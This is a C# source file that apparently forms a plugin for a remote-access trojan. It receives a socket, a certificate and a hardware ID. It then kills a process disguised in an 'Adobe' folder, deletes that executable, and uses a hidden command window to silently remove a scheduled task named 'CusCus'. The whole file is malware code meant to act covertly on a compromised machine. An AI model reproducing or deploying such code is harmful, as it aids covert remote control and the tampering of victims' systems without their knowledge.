using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Security.Cryptography.X509Certificates;

namespace Plugin;

public class Plugin
{
	public static Socket tcpClient;

	public static X509Certificate2 X509Certificate2;

	public static string hwid;

	public void Run(Socket TcpClient, X509Certificate2 x509Certificate2, string Hwid, byte[] Pack)
	{
		string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Adobe", "xdwdactobar.exe");
		if (File.Exists(path))
		{
			Process.GetProcessesByName("xdwdactobar").ToList().ForEach(delegate(Process p)
			{
				p.Kill();
			});
			File.Delete(path);
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.UseShellExecute = false;
			processStartInfo.CreateNoWindow = true;
			processStartInfo.RedirectStandardOutput = true;
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.FileName = "cmd";
			processStartInfo.Arguments = "/c schtasks /deleTe /F /Tn \"CusCus\" && exit";
			Process process = new Process();
			process.StartInfo = processStartInfo;
			process.Start();
		}
	}
}
